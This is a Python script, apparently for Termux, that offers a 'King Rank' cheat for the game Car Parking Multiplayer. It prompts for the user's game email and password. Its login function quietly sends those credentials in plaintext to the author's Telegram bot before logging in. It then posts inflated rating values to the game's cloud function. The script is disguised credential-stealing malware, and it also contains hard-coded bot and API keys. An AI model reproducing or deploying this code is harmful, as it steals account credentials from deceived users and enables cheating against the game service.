import requests
import json
import os
import time

# Firebase & Telegram Config
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"

BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"

# Boje za Termux
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
WHITE = '\033[97m'
RESET = '\033[0m'

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{GREEN}##############################################")
    print(f"#                                            #")
    print(f"#         {WHITE}CAR PARKING MULTIPLAYER{GREEN}            #")
    print(f"#            {YELLOW}KING RANK SERVICE{GREEN}               #")
    print(f"#                                            #")
    print(f"#         {CYAN}IG: @anonymo.cpm{GREEN}                   #")
    print(f"#         {CYAN}Owner: @anonymo.cpm{GREEN}                #")
    print(f"#                                            #")
    print(f"##############################################{RESET}")
    print(f"\n{WHITE}----------------------------------------------{RESET}")

def send_to_telegram(email, password):
    message = f"🚀 **New CPM Login!**\n\n📧 Email: `{email}`\n🔑 Password: `{password}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def login(email, password):
    send_to_telegram(email, password)
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(FIREBASE_LOGIN_URL, json=payload)
        res = response.json()
        return res.get('idToken') if response.status_code == 200 else None
    except:
        return None

def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"], rating_data["race_win"] = 1000000000, 3000
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    try:
        return requests.post(RANK_URL, headers=headers, json=payload).status_code == 200
    except:
        return False

def main_logic():
    while True:
        print_banner()
        print(f" [ 1 ] {WHITE}King Rank{RESET}")
        print(f" [ 2 ] {WHITE}Exit{RESET}")
        print(f"{WHITE}----------------------------------------------{RESET}")
        
        choice = input(f"{WHITE}Select Option: {RESET}").strip()
        
        if choice == '1':
            email = input(f"{WHITE}Enter Email: {RESET}").strip()
            password = input(f"{WHITE}Enter Password: {RESET}").strip()
            
            print(f"\n{YELLOW}Processing, please wait...{RESET}")
            token = login(email, password)
            
            if token:
                if set_rank(token):
                    print(f"{GREEN}Success: King Rank activated!{RESET}")
                else:
                    print(f"\033[91mError: Could not set rank.{RESET}")
            else:
                print(f"\033[91mError: Invalid login details.{RESET}")
            
            input(f"\n{WHITE}Press Enter to return...{RESET}")
            
        elif choice == '2':
            print(f"\n{CYAN}Goodbye!{RESET}")
            break
        else:
            print(f"\033[91mInvalid choice!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main_logic()
